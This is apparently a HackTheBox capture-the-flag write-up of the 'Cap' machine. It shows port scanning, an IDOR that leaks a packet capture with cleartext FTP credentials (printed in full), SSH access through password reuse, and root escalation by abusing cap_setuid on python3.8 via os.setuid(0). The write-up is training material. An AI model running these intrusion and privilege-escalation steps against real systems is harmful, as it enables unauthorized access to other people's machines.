This write-up covers the exploitation of the **Cap** machine from HackTheBox. The attack path involves identifying an Insecure Direct Object Reference (IDOR) vulnerability to download sensitive network captures, extracting cleartext credentials, and leveraging Linux capabilities for privilege escalation to gain root access.
## Overview

- **OS:** Linux
- **Difficulty:** Easy
- **IP Address:** 10.129.11.159
## Reconnaissance

### Port Scanning

We begin by scanning the target machine using Nmap to identify open ports and services:

```bash
nmap -sS -T5 -p- -Pn 10.129.11.159 -vvv
nmap -sV -p21,22,80 10.129.11.159
```

The scan reveals the following open ports:

| Port | Service | Version        | Status |
|------|---------|----------------|--------|
| 21   | FTP     | vsftpd 3.0.3   | Open   |
| 22   | SSH     | OpenSSH 8.2p1  | Open   |
| 80   | HTTP    | Gunicorn       | Open   |

The web server is running Gunicorn, a Python web server gateway interface (WSGI) HTTP server.

### Web Enumeration

Navigating to the web service on port 80, we find a simple dashboard with a side menu and a user profile that doesn't seem to lead anywhere. 

![[Pasted image 20260601221726.png]]

However, exploring the application reveals an interesting page called "Security Snapshot". This page features a "Download" button that allows us to download PCAP (Packet Capture) files. The URL structure for these snapshots is `http://10.129.11.159/data/X`, where `X` represents an ID number.

![[Pasted image 20260601221952.png]]

## Vulnerability Analysis (IDOR)

Given the predictable URL structure, we can test for an Insecure Direct Object Reference (IDOR) vulnerability by changing the ID number. By setting the ID to `0` (`http://10.129.11.159/data/0`), we successfully download a network snapshot that doesn't belong to our session.

We analyze the downloaded `0.pcap` file using the `strings` command to extract readable text:

```bash
strings 0.pcap
```

Within the output, we uncover an FTP login sequence containing cleartext credentials:

```text
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
```

We now have valid credentials: `nathan:Buck3tH4TF0RM3!`.

## Exploitation & Foothold

With these credentials, we can authenticate to the FTP service running on port 21:

```bash
ftp 10.129.11.159
Connected to 10.129.11.159.
220 (vsFTPd 3.0.3)
Name (10.129.11.159:julicc): nathan
331 Please specify the password.
Password:
230 Login successful.
```

We find the `user.txt` flag and download it. Moreover, since password reuse is common, we attempt to use the same credentials to log in via SSH:

```bash
ssh nathan@10.129.11.159
```

The login is successful, providing us with a stable interactive shell as the `nathan` user.

## Privilege Escalation

Once on the system, we start looking for privilege escalation vectors. A common check is to look for binaries with special capabilities using `getcap`:

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

We discover that the `/usr/bin/python3.8` binary has the `cap_setuid` capability enabled. This capability allows the binary to arbitrarily change its User ID (UID), effectively bypassing standard permissions.

We can abuse this by launching Python and using the `os` module to set our UID to `0` (root), and then spawning a root shell:

```bash
nathan@cap:~$ python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system('whoami')
root
0
>>> os.system('bash')
root@cap:~#
```

We successfully obtain a root shell and can now retrieve the root flag.

## Conclusion

The Cap machine provides an excellent demonstration of how a simple IDOR vulnerability can lead to credential exposure. Furthermore, it highlights the dangers of assigning excessive Linux capabilities to standard binaries like Python, which can be trivially abused to escalate privileges to root.